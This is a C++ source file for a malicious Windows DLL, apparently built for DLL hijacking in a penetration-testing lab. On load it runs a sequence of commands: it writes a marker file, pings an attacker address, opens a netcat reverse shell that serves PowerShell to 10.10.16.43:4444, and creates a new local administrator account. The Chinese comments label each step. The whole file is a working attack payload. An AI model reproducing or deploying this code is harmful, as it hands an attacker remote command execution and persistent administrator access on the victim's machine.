#include"pch.h"
#include<windows.h>

#pragma comment (lib, "user32.lib")

DWORD WINAPI MyThread(LPVOID lpParam) {
    // 判断成功
    WinExec("cmd.exe /c echo Byxs20 > C:\\ProgramData\\hello.txt", 0);
    // 反连
    WinExec("cmd.exe /c ping 10.10.16.43", 0);
    // 反弹Shell
    WinExec("cmd.exe /c C:\\Programdata\\nc64.exe 10.10.16.43 4444 -e powershell.exe", 0);
    // 添加管理员
    WinExec("cmd.exe /c net user byxs20 password@2025 /add && net localgroup administrators byxs20 /add", 0);
    return 0;
}


DWORD WINAPI WorkItem(LPVOID lpParam) {
    MyThread(NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL); // Avoid unnecessary notifications

        // Use QueueUserWorkItem to safely execute code after the DLL has been loaded
        QueueUserWorkItem(WorkItem, NULL, WT_EXECUTEDEFAULT);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}